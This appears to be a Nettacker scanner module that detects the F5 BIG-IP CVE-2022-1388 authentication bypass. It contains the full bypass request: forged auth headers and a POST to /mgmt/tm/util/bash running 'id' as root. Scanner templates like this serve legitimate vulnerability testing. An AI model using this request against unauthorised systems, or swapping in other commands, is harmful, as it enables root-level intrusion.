info:
  name: f5_bigip_cve_2022_1388_vuln
  author: Prajwal G N (@Prajwal5755)
  severity: 9.8
  description: Detects F5 BIG-IP CVE-2022-1388 authentication bypass leading to remote command execution via /mgmt/tm/util/bash endpoint.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2022-1388
  profiles:
    - vuln
    - http
    - critical_severity
    - cve
    - f5

payloads:
  - library: http
    steps:

      - method: post
        timeout: 3
        headers:
          Authorization: "Basic YWRtaW46"
          X-F5-Auth-Token: "anything"
          User-Agent: "{user_agent}"
          Content-Type: "application/json"

        ssl: false

        url:
          nettacker_fuzzer:
            input_format: "{{schema}}://{target}:{{ports}}/mgmt/tm/util/bash"
            data:
              schema:
                - "http"
                - "https"
              ports:
                - 80
                - 443
                - 8080
                - 8443

        data: |
          {{
            "command": "run",
            "utilCmdArgs": "-c id"
          }}

        response:
          log: "Confirmed CVE-2022-1388 vulnerability at: response_dependent['url']"
          condition_type: and
          conditions:
            status_code:
              regex: "200"
              reverse: false
            content:
              regex: "uid=0"
              reverse: false
            url:
              regex: ".*"
              reverse: false